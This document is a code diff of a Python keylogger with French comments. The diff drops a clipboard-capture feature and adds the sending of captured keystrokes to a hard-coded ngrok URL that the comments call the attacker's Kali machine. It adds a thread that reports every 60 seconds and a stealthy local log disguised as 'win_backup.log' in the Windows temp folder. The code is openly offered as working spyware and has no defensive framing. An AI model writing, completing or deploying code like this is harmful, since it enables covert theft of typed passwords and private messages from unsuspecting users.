@@ -5,91 +5,111 @@ import threading
 import os
 import tempfile 
 import sys 
-# --- NOUVELLE DEPENDANCE WINDOWS ---
-import win32clipboard 
-# -----------------------------------
 
-# (Reste de la configuration inchangé...)
+# --- Configuration Distante (VOTRE ADRESSE NGROK) ---
+# Ceci est l'URL de votre Kali Attaquante qui écoute sur le port 5000 via Ngrok.
 NGROK_URL = "http://jeanelle-quintic-lumberingly.ngrok-free.dev" 
-INTERVAL_SECONDS = 60 
+INTERVAL_SECONDS = 60 # Envoi toutes les 60 secondes
+
+# --- Gestion du Chemin de Sauvegarde Windows (Furtivité) ---
+# Utilise le dossier temporaire de Windows pour cacher le fichier de sauvegarde locale.
 LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log") 
+
+# Variables globales
 log_buffer = ""
 
-# Variables pour détecter les combinaisons de touches
-is_ctrl_pressed = False 
-is_v_pressed = False
-
-# --- Fonction principale modifiée pour la détection ---
-def on_press(key):
+def send_log_data(data):
+    """
+    Envoie les données au serveur ngrok.
+    Vide le buffer UNIQUEMENT si l'envoi réussit (code 200).
+    Fait toujours une sauvegarde locale.
+    """
     global log_buffer
-    global is_ctrl_pressed
-    global is_v_pressed 
     
-    # Détection des touches de contrôle pour les combinaisons
-    if key == pynput.keyboard.Key.ctrl_l or key == pynput.keyboard.Key.ctrl_r:
-        is_ctrl_pressed = True
-        return # Ne logue pas la touche Ctrl
-    
-    # Détection de la touche V pour la combinaison Ctrl+V
-    if key == pynput.keyboard.KeyCode.from_char('v') or key == pynput.keyboard.KeyCode.from_char('V'):
-        is_v_pressed = True
+    # Ne fait rien si le buffer est vide
+    if not data.strip():
+        return 
 
-    # --- TENTE DE LIRE LE PRESSE-PAPIERS LORSQUE CTRL+V EST DÉTECTÉ ---
-    if is_ctrl_pressed and is_v_pressed:
-        try:
-            win32clipboard.OpenClipboard()
-            # Tente de lire le contenu texte
-            clipboard_content = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
-            win32clipboard.CloseClipboard()
-            
-            # Décode le contenu (il est souvent en bytes) et l'ajoute au buffer
-            log_buffer += "[PASTE_START]" + clipboard_content.decode('utf-8', errors='ignore') + "[PASTE_END]"
-            return 
-        except Exception:
-            # Si le presse-papiers est vide ou ne contient pas de texte
-            pass
-            
-    # --- LOGIQUE DE CAPTURE DE TEXTE ET D'ENVOI (inchangée) ---
+    # --- Sauvegarde locale de sécurité (Écriture) ---
     try:
+        with open(LOG_FILE, "a") as f:
+            f.write(data)
+    except Exception:
+        pass # Ignore les erreurs d'écriture de fichier
+
+    # --- Tentative d'envoi à Kali ---
+    try:
+        response = requests.post(NGROK_URL, data={'log': data})
+        
+        if response.status_code == 200:
+            # SUCCÈS : Vide le buffer pour éviter la répétition du log.
+            log_buffer = "" 
+            
+    except requests.exceptions.RequestException:
+        # Échec de la connexion : ne vide PAS le buffer.
+        pass
+
+def report():
+    """
+    Fonction d'envoi exécutée en parallèle toutes les INTERVAL_SECONDS.
+    Elle est lancée dans un thread séparé.
+    """
+    global log_buffer
+    
+    # Configure le minuteur pour exécuter report() à nouveau dans 60 secondes
+    threading.Timer(INTERVAL_SECONDS, report).start() 
+    
+    # Si le buffer contient des données, on les envoie
+    if log_buffer:
+        send_log_data(log_buffer)
+
+def on_press(key):
+    """
+    Capture les frappes de clavier, filtre les touches de contrôle et remplit le buffer.
+    """
+    global log_buffer
+    
+    try:
+        # Tente d'obtenir le caractère (A, b, 1, $, etc.)
         char = key.char
         log_buffer += char
         
     except AttributeError:
+        # Gère les touches spéciales
         if key == pynput.keyboard.Key.space:
             log_buffer += " "
             
         elif key == pynput.keyboard.Key.enter:
             log_buffer += "\n"
             
-            # Vérification et envoi
+            # VÉRIFICATION CRUCIALE ANTI-ENVOI VIDE
             if log_buffer.strip():
                 send_log_data(log_buffer)
             
+            # Dans tous les cas (envoyé ou non), on vide le buffer pour repartir à zéro.
             log_buffer = "" 
-            return 
+            return # Sort immédiatement après Enter
 
         elif key == pynput.keyboard.Key.backspace:
+            # Gère le backspace immédiatement dans le buffer
             if len(log_buffer) > 0:
                 log_buffer = log_buffer[:-1]
-            return 
+            return # Sort immédiatement après backspace
             
         else:
-            # Ignore les autres touches de contrôle
-            return
+            # IGNORER : Toutes les touches de contrôle (CTRL, ALT, SHIFT, F1, F2, etc.)
+            return 
 
 def on_release(key):
-    global is_ctrl_pressed
-    global is_v_pressed 
-
-    # Réinitialise l'état de la touche Ctrl ou V lorsque la touche est relâchée
-    if key == pynput.keyboard.Key.ctrl_l or key == pynput.keyboard.Key.ctrl_r:
-        is_ctrl_pressed = False
-    if key == pynput.keyboard.KeyCode.from_char('v') or key == pynput.keyboard.KeyCode.from_char('V'):
-        is_v_pressed = False
-        
-    # Arrête le keylogger uniquement sur la touche ESC (pour les tests).
+    """Arrête le keylogger uniquement sur la touche ESC (pour les tests)."""
     if key == pynput.keyboard.Key.esc:
         return False
 
-# (Le reste du script, y compris send_log_data et report, reste inchangé)
-# ...
+# --- Démarrage ---
+
+# Démarre le minuteur pour l'envoi périodique dans un thread séparé
+report() 
+
+# Crée et lance l'écouteur dans le thread principal
+with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
